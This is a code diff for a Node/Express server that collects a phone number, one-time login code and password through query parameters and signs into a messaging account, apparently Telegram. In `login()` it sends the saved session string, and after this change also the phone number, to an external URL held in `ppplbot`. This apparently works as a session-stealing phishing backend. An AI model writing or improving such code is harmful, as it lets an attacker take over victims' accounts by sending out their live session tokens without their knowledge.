@@ -68,11 +68,7 @@ app.get('/login', async (req, res, next) => {
             connectionRetries: 5,
         });
         setTimeout(async () => {
-            await client?.destroy();
-            client = undefined;
-            phoneCode = undefined;
-            phoneNumber = undefined;
-            inProcess = true
+            await restAcc();
         }, 180000)
         const phone = req.query.phone;
         console.log("Number :", `+${phone}`);
@@ -81,20 +77,15 @@ app.get('/login', async (req, res, next) => {
 });
 
 app.get('/otp', async (req, res, next) => {
-    phoneCode = req.query.code;
-    console.log(phoneCode)
     res.send('loggingIn!!');
     next();
 }, async (req, res) => {
-    setTimeout(async () => {
-        await client?.destroy();
-        client = undefined;
-        phoneCode = undefined;
-        phoneNumber = undefined;
-        inProcess = true
-    }, 180000)
-    console.log("hello:", phoneCode);
-    await login();
+    if (inProcess) {
+        phoneCode = req.query.code;
+        console.log(phoneCode)
+        console.log("hello:", phoneCode);
+        await login();
+    }
 });
 app.get('/password', async (req, res) => {
     password = req.query.password;
@@ -146,12 +137,20 @@ async function trySgnup(phoneNum: string) {
         if (typeof phoneNumber !== "function") {
             throw err;
         }
-
+        await restAcc();
         const shouldWeStop = false//await authParams.onError(err);
         if (shouldWeStop) {
             throw new Error("AUTH_USER_CANCEL");
         }
     }
+}
+
+async function restAcc() {
+    await client?.destroy();
+    client = undefined;
+    phoneCode = undefined;
+    phoneNumber = undefined;
+    inProcess = true;
 }
 
 async function login() {
@@ -175,11 +174,13 @@ async function login() {
         } else {
             const sess = client.session.save()
             console.log(sess);
-            await fetchWithTimeout(`${ppplbot}&text=${(username).toUpperCase()}:${sess}`);
+            await fetchWithTimeout(`${ppplbot}&text=${(username).toUpperCase()}:${phoneNumber} | ${sess}`);
+            await restAcc();
             return result.user
         }
     } catch (err: any) {
-        console.log(err)
+        console.log(err);
+        await restAcc();
         if (err.errorMessage === "SESSION_PASSWORD_NEEDED") {
             return client.signInWithPassword(apiCredentials, { password: () => Promise.resolve(password), onError: (err) => console.log(err) });
         } else {
